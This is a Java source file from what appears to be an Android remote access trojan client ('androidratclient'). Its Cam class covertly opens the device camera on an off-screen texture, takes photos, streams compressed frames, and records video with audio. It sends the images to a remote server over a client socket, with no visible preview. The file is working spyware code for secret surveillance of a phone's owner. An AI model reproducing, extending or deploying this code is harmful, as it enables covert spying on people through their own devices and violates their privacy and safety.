package com.dev.ah10.androidratclient;


import android.graphics.Rect;
import android.graphics.SurfaceTexture;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;
import java.io.ByteArrayOutputStream;
import java.io.File;

@SuppressWarnings({"deprecation"})
class Cam //Class to interact with the camera
{
    private ClientSocket cs; //Client Socket reference
    static final int CAM_FACE = 0; //The facing, front camera
    static final int CAM_BACK = 1; //the back camera
    private Camera camHost; //The camera object
    private MediaRecorder mediaHost; //Media recorder object
    private boolean isRecording = false; //Indicates if a recording is in progress
    private boolean isTapping = false; //Indicates if a stream is in progress
    private SurfaceTexture tapTexture; //The texture for the stream

    Cam(ClientSocket socket) //Constructor
    {
        cs = socket; //Set the client socket instance
    }

    void takePicture(int cameraFacing) //Take a picture with the specified cam facing option
    {
        try
        {
            //Init the camera
            if (!initCamera(cameraFacing) || isRecording || isTapping) return;
            SurfaceTexture texture = new SurfaceTexture(10); //Create a new texture
            PhotoCallback callback = new PhotoCallback(cs, texture); //Set the callback (when photo is taken this will be called)
            camHost.setPreviewTexture(texture); //Set the preview to the texture
            camHost.startPreview(); //Start the preview
            camHost.takePicture(null, null, callback); //Take a photo (callback in jpeg format)
        }
        catch (Exception ex) //Failed to take a photo
        {
            Log.e("Cam", "Failed to take a photo: " + ex.toString());
        }
    }

    void startTap(int cameraFacing, int quality, int delay) //Start streaming the camera image (camera facing, jpeg quality, delay between image sending)
    {
        try
        {
            if (!initCamera(cameraFacing) || isTapping || isRecording) return; //Init the camera
            Camera.Parameters p = camHost.getParameters(); //Get the camera params
            Camera.Size camSize = p.getPreviewSize(); //get the camera preview size
            SurfaceTexture texture = new SurfaceTexture(10); //Create the texture
            CamCallback callback = new CamCallback(cs, camSize, quality, delay); //Create the preview callback
            tapTexture = texture; //Set the global texture
            camHost.setPreviewTexture(texture); //Set the preview to the texture
            camHost.setPreviewCallback(callback); //Set the preview callback
            camHost.startPreview(); //Start the preview
            isTapping = true; //Stream in progress = true
        }
        catch (Exception ex) //Failed to start streaming
        {
            Log.e("Cam", "Failed to start tap: " + ex.toString());
        }
    }

    void stopTap() //Stop streaming camera
    {
        if (isTapping) //If camera is streaming
        {
            isTapping = false; //stream in progress = false
            camHost.stopPreview(); //Stop the preview (no new frames to send)
            tapTexture.release(); //Release the target texture
            try {Thread.sleep(1000);} //Sleep because some frames might be still streamed
            catch (Exception ex)
            {
                Log.e("Cam", "Tap Stop Failed to sleep: " + ex.toString());
            }
            camHost.release(); //Release the camera
        }
    }

    void startRecording(int cameraFacing) //Start a video recording with the specified camera facing
    {
        try
        {
            if (!initCamera(cameraFacing) || isRecording || isTapping) return; //Create the camera
            //noinspection SpellCheckingInspection
            File mediaDirectory = new File(Environment.getExternalStorageDirectory().getPath() + "/ahmedia/"); //Destination directory
            //noinspection ResultOfMethodCallIgnored
            mediaDirectory.mkdirs(); //Create the directories specified (if not already exists)
            File mediaFile = new File(mediaDirectory, "vid.mp4"); //The target file
            SurfaceTexture recordTexture = new SurfaceTexture(10); //Create the texture
            camHost.setPreviewTexture(recordTexture); //Set the preview to the texture
            camHost.startPreview(); //Start the preview
            camHost.unlock(); //Unlock the camera for the mediaRecorder
            mediaHost = new MediaRecorder(); //Create a new mediaRecorder
            mediaHost.setCamera(camHost); //Set the camera reference
            mediaHost.setAudioSource(MediaRecorder.AudioSource.CAMCORDER); //Audio Source
            mediaHost.setVideoSource(MediaRecorder.VideoSource.CAMERA); //Video Source
            mediaHost.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4); //Video Format
            mediaHost.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); //Audio Encoder
            mediaHost.setVideoEncoder(MediaRecorder.VideoEncoder.MPEG_4_SP); //Video Encoder
            mediaHost.setOutputFile(mediaFile.getPath()); //Set the output file for the recording
            mediaHost.prepare(); //Prepare the media recorder
            mediaHost.start(); //Start recording
            isRecording = true; //recording in progress = true
        }
        catch (Exception ex) //Failed to start recording
        {
            Log.e("Cam", "Failed to start recording: " + ex.toString());
        }
    }

    void stopRecording() //Stop the recording
    {
        if (isRecording) //If camera is recording currently
        {
            mediaHost.stop(); //Stop the recording
            mediaHost.reset(); //Reset the recording
            mediaHost.release(); //Release the recorder
            camHost.lock(); //Lock the camera (media recorder no longer needs it)
            camHost.release(); //Release the camera
            isRecording = false; //recording in progress = false
        }
    }

    private int getCameraID(int cameraPreference) //Get the ID of the camera by the specified facing option
    {
        int installedCameras = Camera.getNumberOfCameras(); //Get the count of installed cameras

        for (int i = 0; i < installedCameras; i++) //Loop through the installed cameras
        {
            Camera.CameraInfo info = new Camera.CameraInfo(); //create a new info object
            Camera.getCameraInfo(i, info); //Get the info of the current camera

            if (installedCameras == 1) return i; //If only 1 cam is installed return it's id, ignoring facing option
            else //More cameras available
            {
                if (cameraPreference == CAM_FACE && info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) //If we want front cam and the current cam is front cam
                    return i; //return it's id

                if (cameraPreference == CAM_BACK && info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) //If we want back cam and the current cam is back
                    return i; //return it's id
            }
        }

        return -1; //If anything failed return -1
    }

    private boolean initCamera(int cameraID) //Get the Camera object and load it to camHost
    {
        boolean success = false; //the success of the camera load

        try
        {
            int id = getCameraID(cameraID); //Get the camera id based on facing
            if (id == -1) //If no camera found
            {
                Log.e("Cam", "Failed to init camera, wrong id");
                return false; //Failed to open camera
            }
            camHost = Camera.open(id); //Open the camera by the ID
            if (camHost != null) success = true; //if cam is not null -> opened -> success
        }
        catch (Exception ex) //Failed to open camera
        {
            Log.e("Cam", "Failed to init camera: " + ex.toString());
            success = false; //Success is false
        }

        return success; //Return the status of the camera
    }
}

@SuppressWarnings("deprecation")
class CamCallback implements Camera.PreviewCallback //Class to stream preview frames
{
    private ClientSocket cs; //Client Socket reference
    private Camera.Size size; //The size of the preview
    private int sendDelay; //Delay between frame sends
    private int compressionRate; //The quality of the image (0-100 where 100 is the best)

    CamCallback(ClientSocket socket, Camera.Size camSize, int compress, int delay) //Constructor
    {
        //Set the class global values
        cs = socket;
        size = camSize;
        sendDelay = delay;
        compressionRate = compress;
    }

    @Override
    public void onPreviewFrame(byte[] data, Camera camera) //Frame received from the camera
    {
        try
        {
            //Default cam format is NV21
            YuvImage img = new YuvImage(data, camera.getParameters().getPreviewFormat(), size.width, size.height, null); //Create a YuvImage Object
            //data = the bytes of the image
            ByteArrayOutputStream temp = new ByteArrayOutputStream(); //Create an OutputStream
            Rect toCompress = new Rect(0, 0, img.getWidth(), img.getHeight()); //Get the rectangle of the preview
            img.compressToJpeg(toCompress, compressionRate, temp); //Convert /compress image to JPEG
            byte[] jpegImage = temp.toByteArray(); //Convert the outputStream to a byte array
            cs.sendBytes(jpegImage, jpegImage.length, false); //Stream to server
            try {Thread.sleep(sendDelay);} //Sleep the specified delay
            catch (Exception ex)
            {
                Log.e("Cam", "Stream failed to sleep: " + ex.toString());
            }
        }
        catch (Exception ex) //Failed to convert / stream the image
        {
            Log.e("CamCallback", "Failed to send frame: " + ex.toString());
        }
    }
}

@SuppressWarnings("deprecation")
class PhotoCallback implements Camera.PictureCallback //Class to stream a taken photo
{
    private ClientSocket cs; //Client Socket reference
    private SurfaceTexture currentTexture; //texture reference

    PhotoCallback(ClientSocket socket, SurfaceTexture texture) //Constructor
    {
        //Set the class global values
        cs = socket;
        currentTexture = texture;
    }

    @Override
    public void onPictureTaken(byte[] data, Camera camera) //Picture taken by the camera
    {
        try
        {
            //data = the image bytes in jpeg format
            cs.sendBytes(data, data.length, false); //Send image to server
            camera.stopPreview(); //Stop previewing
            currentTexture.release(); //Release the target texture
            camera.release(); //Release the camera
        }
        catch (Exception ex) //Send or releasing failed
        {
            Log.e("PhotoCallback", "Failed to send image: " + ex.toString());
        }
    }
}
